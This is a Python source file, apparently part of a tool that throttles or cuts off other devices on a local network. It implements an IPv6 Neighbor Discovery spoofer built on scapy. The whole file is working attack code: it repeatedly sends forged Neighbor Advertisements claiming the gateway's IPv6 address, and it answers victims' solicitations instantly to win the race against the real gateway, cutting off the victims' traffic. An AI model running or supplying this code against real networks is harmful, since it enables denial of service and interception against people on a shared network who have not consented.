import time
import threading
from scapy.all import Ether, IPv6, ICMPv6ND_NA, ICMPv6ND_NS, ICMPv6NDOptDstLLAddr, sendp, sniff # pylint: disable=no-name-in-module

from . import utils


class NDPSpoofer(object):
    """
    IPv6 counterpart to ARPSpoofer. IPv4-only ARP spoofing has no effect
    on a host's IPv6 traffic, so on any network with a working IPv6
    default route (increasingly the common case), a limited/blocked
    host simply keeps browsing over IPv6 - untouched by ARP poisoning
    and by the IPv4-only iptables rules in limit.py.

    Periodically blasts an unsolicited Neighbor Advertisement to each
    tracked host, claiming the local machine's MAC owns the IPv6
    default gateway's address - the NDP equivalent of an ARP spoof.
    That reroutes the host's IPv6 default-route traffic to this
    machine at layer 2, where it is silently dropped since IPv6
    forwarding is never enabled by this application.

    A periodic blast alone self-heals within a second or two: unlike
    plain ARP, IPv6 Neighbor Unreachability Detection actively probes
    a stale entry (unicast, straight to whatever MAC is cached - i.e.
    us) and, hearing nothing back, falls back to a multicast solicit
    that the real gateway answers, reverting the poison. To close
    that window this also sniffs for the host's own Neighbor
    Solicitations asking about the gateway and answers them directly
    and immediately with a solicited spoofed advertisement, the same
    technique thc-ipv6's ndpspoof/parasite6 use.

    A no-op if the network has no IPv6 default route.
    """
    def __init__(self, interface, gateway_ip6):
        self.interface = interface
        self.gateway_ip6 = gateway_ip6

        # interval in s spoofed NA packets are sent to targets
        self.interval = 2

        self._own_mac = utils.get_interface_mac(interface)
        self._hosts = set()
        self._hosts_lock = threading.Lock()
        self._running = False

    def add(self, host):
        with self._hosts_lock:
            self._hosts.add(host)

    def remove(self, host):
        with self._hosts_lock:
            self._hosts.discard(host)

    def start(self):
        if self.gateway_ip6 is None or self._running:
            return

        self._running = True
        threading.Thread(target=self._spoof, args=[], daemon=True).start()
        threading.Thread(target=self._listen, args=[], daemon=True).start()

    def stop(self):
        self._running = False

    def _spoof(self):
        while self._running:
            with self._hosts_lock:
                hosts = self._hosts.copy()

            for host in hosts:
                if not self._running:
                    return

                self._send_unsolicited_na(host.mac)

            time.sleep(self.interval)

    def _listen(self):
        def pkt_handler(pkt):
            if not pkt.haslayer(ICMPv6ND_NS) or not pkt.haslayer(Ether):
                return

            if pkt[ICMPv6ND_NS].tgt != self.gateway_ip6:
                return

            src_mac = pkt[Ether].src.lower()
            with self._hosts_lock:
                tracked = any(h.mac.lower() == src_mac for h in self._hosts)

            if tracked:
                self._send_solicited_na(pkt[Ether].src, pkt[IPv6].src)

        def stop_filter(pkt):
            return not self._running

        sniff(
            iface=self.interface,
            filter='icmp6',
            prn=pkt_handler,
            stop_filter=stop_filter,
            store=0
        )

    def _send_unsolicited_na(self, dst_mac):
        # periodic blast, sent to the all-nodes multicast address but
        # delivered only to dst_mac at layer 2 (same trick ARPSpoofer
        # uses to target one host with a unicast Ethernet frame)
        packet = (
            Ether(dst=dst_mac) /
            IPv6(dst='ff02::1') /
            ICMPv6ND_NA(tgt=self.gateway_ip6, R=0, S=0, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=self._own_mac)
        )

        sendp(packet, verbose=0, iface=self.interface)

    def _send_solicited_na(self, dst_mac, dst_ip6):
        # direct reply to a host's own neighbor solicitation for the
        # gateway, sent the instant it's seen to win the race against
        # the real gateway's reply
        packet = (
            Ether(dst=dst_mac) /
            IPv6(dst=dst_ip6) /
            ICMPv6ND_NA(tgt=self.gateway_ip6, R=0, S=1, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=self._own_mac)
        )

        sendp(packet, verbose=0, iface=self.interface)
